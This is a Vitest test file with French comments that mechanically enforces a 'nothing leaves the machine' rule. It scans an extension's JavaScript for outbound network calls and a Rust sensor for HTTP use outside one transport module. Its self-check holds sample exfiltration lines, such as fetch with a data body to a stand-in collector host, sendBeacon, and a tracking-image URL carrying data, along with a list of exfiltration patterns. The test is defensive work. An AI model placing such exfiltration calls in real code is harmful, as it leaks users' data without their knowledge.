import { readdir, readFile } from 'node:fs/promises';
import { extname, join } from 'node:path';
import { describe, expect, it } from 'vitest';

/**
 * INVARIANT I, rendu mécanique : **aucun contenu utilisateur ne quitte le poste**.
 *
 * C'est la première règle du projet, et jusqu'ici elle était gardée par des
 * commentaires. Celui de `service-worker.js` est exact — ce fichier-là n'a ni
 * `fetch` ni socket, et il le dit de lui-même. Ce qui manquait, c'est que
 * **personne ne regardait le reste de l'extension** : `motifs.js` appelle bien
 * `fetch`, vers `chrome.runtime.getURL(...)`, c'est-à-dire un fichier empaqueté.
 * Rien ne sortait. Mais rien ne le vérifiait non plus, et la différence entre
 * les deux est toute la valeur d'un banc.
 *
 * Ce banc demande que la garantie soit **visible sur la ligne** : une cible
 * calculée trois lignes plus haut oblige le lecteur à la suivre, et un lecteur
 * qui doit suivre est un lecteur qui, un jour, ne suivra pas.
 *
 * ## Deux frontières, deux contrôles
 *
 * L'extension vit dans le navigateur, au contact des pages. C'est le point du
 * système le plus proche du contenu de l'utilisateur, et le seul qui pourrait
 * l'envoyer ailleurs sans que personne ne s'en aperçoive.
 *
 * Le capteur, lui, parle au réseau — c'est son travail depuis la spec 003. Mais
 * il ne doit lui parler que par **un seul chemin** : celui qui vérifie l'hôte,
 * masque le jeton, refuse les redirections et borne la réponse. Un second
 * chemin n'hériterait d'aucune de ces garanties.
 */

const EXTENSION = 'apps/extension';
const CAPTEUR = 'apps/desktop/src-tauri/src';

/** Le seul module autorisé à parler au réseau côté capteur. */
const PORTE_RESEAU = 'transport.rs';

async function fichiers(dossier: string, ext: string): Promise<string[]> {
  const sortie: string[] = [];
  for (const e of await readdir(dossier, { withFileTypes: true })) {
    const p = join(dossier, e.name);
    if (e.isDirectory()) sortie.push(...(await fichiers(p, ext)));
    else if (extname(e.name) === ext && !e.name.endsWith(`.test${ext}`)) sortie.push(p);
  }
  return sortie;
}

describe('INVARIANT I — rien ne sort du poste', () => {
  it('chaque fetch de l extension vise une ressource empaquetee', async () => {
    // Un `fetch` vers une URL distante serait une voie d'exfiltration, et il
    // aurait l'air d'un chargement de configuration.
    const fautes: string[] = [];
    for (const f of await fichiers(EXTENSION, '.js')) {
      const contenu = await readFile(f, 'utf8');
      for (const [i, ligne] of contenu.split('\n').entries()) {
        if (!/\bfetch\s*\(/.test(ligne)) continue;
        if (!/chrome\.runtime\.getURL/.test(ligne)) {
          fautes.push(`${f}:${i + 1} — ${ligne.trim()}`);
        }
      }
    }
    expect(fautes, `fetch hors des ressources locales :\n${fautes.join('\n')}`).toEqual([]);
  });

  it('l extension n a aucun autre moyen d emettre', async () => {
    // Les balises d'analyse ne passent pas par `fetch` : une image dont l'URL
    // porte la donnee suffit, et c'est la forme la plus discrete de toutes.
    const moyens = [
      /XMLHttpRequest/,
      /\bWebSocket\b/,
      /sendBeacon/,
      /new\s+Image\s*\(/,
      /\bEventSource\b/,
      /navigator\.connection/,
    ];
    const fautes: string[] = [];
    for (const f of await fichiers(EXTENSION, '.js')) {
      const contenu = await readFile(f, 'utf8');
      for (const [i, ligne] of contenu.split('\n').entries()) {
        // Les commentaires ont le droit de NOMMER ce qu'ils interdisent.
        const code = ligne.replace(/\/\/.*$/, '').replace(/^\s*\*.*$/, '');
        for (const m of moyens) {
          if (m.test(code)) fautes.push(`${f}:${i + 1} — ${ligne.trim()}`);
        }
      }
    }
    expect(fautes, `moyen d emission dans l extension :\n${fautes.join('\n')}`).toEqual([]);
  });

  it('le capteur ne parle au reseau que par sa porte unique', async () => {
    // `transport.rs` verifie l hote, masque le jeton, refuse les redirections et
    // borne la reponse. Un second chemin n'heriterait d'aucune de ces garanties,
    // et personne ne s'en apercevrait avant longtemps.
    const fautes: string[] = [];
    for (const f of await fichiers(CAPTEUR, '.rs')) {
      if (f.endsWith(PORTE_RESEAU)) continue;
      const contenu = await readFile(f, 'utf8');
      for (const [i, ligne] of contenu.split('\n').entries()) {
        const code = ligne.replace(/\/\/.*$/, '');
        if (/\bureq::/.test(code)) fautes.push(`${f}:${i + 1} — ${ligne.trim()}`);
      }
    }
    expect(fautes, `usage du client HTTP hors de ${PORTE_RESEAU} :\n${fautes.join('\n')}`).toEqual(
      [],
    );
  });

  it('les balayages voient vraiment des fichiers', async () => {
    // Un dossier renomme, et les trois cas precedents passeraient au vert en ne
    // lisant rien.
    expect((await fichiers(EXTENSION, '.js')).length).toBeGreaterThan(3);
    expect((await fichiers(CAPTEUR, '.rs')).length).toBeGreaterThan(10);
  });

  it('sait dire non', async () => {
    // Sans ce cas, une expression reguliere cassee rendrait le banc
    // definitivement vert.
    const emissions = [
      `${'fetch'}('https://collecteur.example', { body: donnees })`,
      'new XMLHttpRequest()',
      "navigator.sendBeacon('/collecte', d)",
      "new Image().src = 'https://x.invalid/?d=' + d",
    ];
    const motifs = [
      /\bfetch\s*\(/,
      /XMLHttpRequest/,
      /sendBeacon/,
      /new\s+Image\s*\(/,
      /\bWebSocket\b/,
    ];
    for (const e of emissions) {
      expect(
        motifs.some((m) => m.test(e)),
        `aucun motif n attrape « ${e} »`,
      ).toBe(true);
    }
    // Et le cas legitime reste legitime.
    const local = "await fetch(chrome.runtime.getURL('motifs.json'))";
    expect(/\bfetch\s*\(/.test(local) && /chrome\.runtime\.getURL/.test(local)).toBe(true);
  });
});
